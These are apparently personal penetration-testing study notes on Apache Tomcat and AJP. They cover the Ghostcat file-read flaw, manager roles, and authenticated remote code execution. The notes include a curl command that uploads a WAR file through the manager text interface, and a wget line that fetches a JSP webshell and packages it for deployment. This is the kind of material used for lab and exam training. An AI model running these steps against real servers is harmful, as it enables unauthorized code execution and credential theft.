<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Tomcat + AJP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Tomcat + AJP</h1><br/><p><h1>Apache Tomcat Background</h1></p><p>See <a href="https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/">Exploit-Notes</a>. More info on Hacktricks for <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info">Basic Info</a> &amp; <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">Pentesting</a> Apache Tomcat. Def port is <strong>8080</strong>.</p><p></p><p>Uses HTTP Basic Auth by default, so Auth is handled via HTTP Header instead of a Cookie.</p><p></p><p>Unlike Apache which uses PHP, Apache Tomcat uses <span style="color:#ff0000;">Java</span> (JSP).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: <a href="Misc_Attacks--Password_Attack_5.html#WebApp Brute Force">BF attacks</a> <span style="color:#ff0000;">FAILED to identify valid creds</span>, using both <em>patator</em> &amp; <em>hydra</em>. Isolated incident? Unreliable methods?</p><p></p><p><h2>Tomcat: Interesting Files</h2><ol><li><strong>WEB-INF/web.xml</strong></li></ol><strong></strong></p><p><strong></strong><ol><li><strong>auth.jsp</strong></li></ol><strong></strong></p><p><strong></strong><ol><li><strong>conf/tomcat-users.xml</strong></li></ol><strong></strong></p><p><strong></strong><ol><li><strong>/usr/share/tomcat9/etc/tomcat-users.xml</strong> (This likely requires local access)</li></ol></p><p></p><p><strong>/manager/html </strong>also references “Manager&#39;s <strong>context.xml</strong>” file?</p><p></p><p><h2>User Privileges</h2></p><p>Even with high level access, may need to access Admin pages in specific ways! The def URLs used by each User Role are listed below.</p><p><ol><li><strong>manager-gui</strong>: Access HTML GUI &amp; status pages (e.g <strong>/manager/html</strong>). RCE via GUI browser.</li></ol></p><p><ol><li><strong>manager-script</strong>: Access text interface &amp; status pages (e.g <strong>/manager/text/</strong>). Example RCE <a href="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00">here</a> (I prefer JSP Webshell over their Meterpreter payload).</li></ol></p><p><ol><li><strong>manager-jmx</strong>: Access JMX proxy &amp; status pages (e.g <strong>/manager/jmxproxy?qry=</strong>)</li></ol></p><p><ol><li><strong>manager-status</strong>: Access status pages only.</li></ol></p><p></p><p><h3>CSRF &amp; Protections</h3></p><p>HTML interface is protected from CSRF, but Text (script) &amp; JMX aren&#39;t. This is because users in 1 shouldn&#39;t be in either 2 or 3, &amp; 2 or 3 should be used with CLi tool instead of browsers.</p><p></p><p>These are just Tomcat&#39;s guidelines, &amp; developers may implement / utilize user privileges in insecure ways. allowing for CSRF to RCE.</p><p></p><p><h2>Apache JServ Protocol (AJPv13)</h2></p><p>Def port is <strong>8009</strong>. Often used in conjunction with Tomcat. Shouldn&#39;t be publically accessible, so if you see it try exploits like Ghostcat. See <a href="https://exploit-notes.hdks.org/exploit/web/framework/java/ajp-pentesting/">link</a> for Enumeration tips.</p><p></p><p><h3>Background</h3></p><p>A <a href="Infrastructure_36.html#Binary Protocol">binary protocol</a> that can proxy inbound requests from a web server through to an application server that sits behind the web server (i.e Reverse proxying requests from a FE Web Server to a BE Application Server).</p><p></p><p>Performs load balancing &amp; can increase speed / efficiency for communications between the FE &amp; BE.</p><p></p><p>AJP is a highly trusted protocol and <span style="color:#ff0000;">should never be exposed to untrusted clients</span>, which could use it to gain access to <span style="color:#ff0000;">sensitive information</span> or <span style="color:#ff0000;">RCE</span> on the application server. </p><p></p><p>If you are fronting your app server with a web proxy server, AJP allows you to skip that extra parsing and just pass efficient binary representations of the headers between the proxy server and the app server.</p><p></p><p><span class="subheading">Without AJP</span>: <strong>Client &lt;- http/s-&gt; Proxy &lt;- http/s -&gt; App</strong></p><p></p><p><span class="subheading">With AJP</span>: <strong>Client &lt;- http/s-&gt; Proxy &lt;- AJP -&gt; App</strong></p><p></p><p><h3>Ghostcat (CVE-2020-1938)</h3></p><p><a href="https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md">Ghostcat</a> is a <span style="color:#ff0000;">file read/inclusion</span> vulnerability in the AJP connector in Apache Tomcat. This is enabled by default with a default configuration port of 8009.</p><p></p><p>A remote, unauthenticated attacker could exploit this vulnerability to read web application files from a vulnerable server.</p><p></p><p>In instances where the vulnerable server allows file uploads, an attacker could upload malicious JavaServer Pages (JSP) code within a variety of file types and trigger this vulnerability to gain RCE.</p><p></p><p><span class="subheading">Exploitation</span>: <a href="https://www.exploit-db.com/exploits/48143">PoCs</a> typically fetch the <strong>WEB-INF/web.xml</strong> file by def, which <span style="color:#ff0000;">may contain credentials</span> for Tomcat, MySQL, etc. The Exploit-DB PoC must be run with <span style="color:#ff0000;">python2</span>. See above for other interesting files to fetch.</p><p></p><p><h1>Recon</h1></p><p><h2>Tomcat Scanner</h2></p><p><a href="https://github.com/p0dalirius/ApacheTomcatScanner">ApacheTomcatScanner</a> should be run inside a <a href="Exploit_Research_3.html#python venv">python virtual env</a> due to its dependencies.</p><p></p><p>AD argument optional?</p><p></p><p><em>python3 ApacheTomcatScanner.py -tt 192.168.99.101 -tp 8080 -ai 192.168.99.100 -ad oscp.exam --list-cves</em></p><p></p><p><h3>Example Output</h3></p><p>(False Positives for CVEs?)</p><p></p><p><strong>Apache Tomcat Scanner v3.7 - by @podalirius_</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>[+] Targeting 1 ports on 1 hosts.</strong><strong></strong></p><p><strong>[+] Searching for Apache Tomcats servers on specified targets ...</strong><strong></strong></p><p><strong>[&gt;] [Apache Tomcat/8.5.19] on 192.168.99.101:8080 (manager: accessible) on http://192.168.99.101:8080/manager/html </strong><strong></strong></p><p><strong>  | CVEs: CVE-2017-12617, CVE-2020-13943, CVE-2022-25762, CVE-2022-42252</strong><strong></strong></p><p><strong>[2024/04/13 20h58m04s] Status (0/1)  0.00 % | Rate 0 tests/s        </strong><strong></strong></p><p><strong>[+] All done!</strong></p><p></p><p></p><p><h1>Authenticated RCE</h1></p><p>The URLs referenced are def paths, but custom values may be used instead, neccesitating subdir BF.</p><p></p><p><h2>manager-gui Privileges</h2></p><p>Login prompt is typically found at <strong>/manager/html</strong>. If your account has enough privs, you&#39;ll see <strong>WAR file to deploy</strong> ↓ <strong>Browse</strong> then <strong>Deploy</strong>.</p><p></p><p><h2>manager-script Privileges</h2></p><p>May or may not need to append <strong>&amp;update=true</strong> parameter to curl command for URL to be browsable. The output from curl should say OK.</p><p></p><p><em>curl -v -u ‘USER:PASS’ --upload-file /path/backup.war “http://IP:8080/manager/text/deploy?path=/shell&amp;update=true”</em></p><p></p><p><h2>Prepare Payload</h2></p><p>Alternate methods listed on Hacktricks. I saved the below webshell to <a href="file:///usr/share/webshells/jsp/cmd.jsp">cmd.jsp</a>.</p><p></p><p><em>wget </em><em><a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp</a></em></p><p></p><p><em>zip -r backup.war cmd.jsp </em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Alternate method</span>: <em>jar cvf exploit.war /usr/share/webshells/jsp/cmd.jsp</em></p><p></p><p><h3>Trigger Payload</h3></p><p>It may be triggered differently depending on context. For instance, whether you&#39;re using a browser or curl &amp; whether you&#39;re using a Reverse Shell or a Web Shell.</p><p></p><p>Sometimes you can trigger a Reverse Shell by accessing the WAR file directory (e.g <strong>/shell/</strong> for <em>/manager/text/deploy?path=/shell</em>).</p><p></p><p>Other times you need to access the specific payload file packaged in the <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#war files">WAR file</a>. For instance, <strong>/shell/</strong> may give you a 404, but <strong>/shell/cmd.jsp</strong> lets you access webshell!</p></div>
</body>
</html>
